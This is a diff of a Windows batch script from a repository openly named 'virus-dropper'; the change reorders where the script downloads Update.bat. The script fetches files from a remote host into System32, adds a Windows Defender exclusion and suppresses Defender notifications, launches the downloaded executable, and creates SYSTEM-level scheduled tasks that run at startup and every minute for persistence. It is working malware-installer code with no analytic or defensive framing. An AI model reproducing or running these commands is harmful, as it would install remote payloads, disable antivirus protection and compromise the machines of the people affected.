@@ -22,6 +22,8 @@ curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Wi
 
 
 move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" "%appdata%\update.bat"
+move "%appdata%\update.bat" "%systemroot%\System32\windowsexe\Update.bat"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Windows.exe'"
@@ -29,8 +31,6 @@ powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Update.bat'"
 powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\AV.bat'"
 start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
 move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" "%appdata%\update.bat"
-move "%appdata%\update.bat" "%systemroot%\System32\windowsexe\Update.bat"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
 SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
 SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
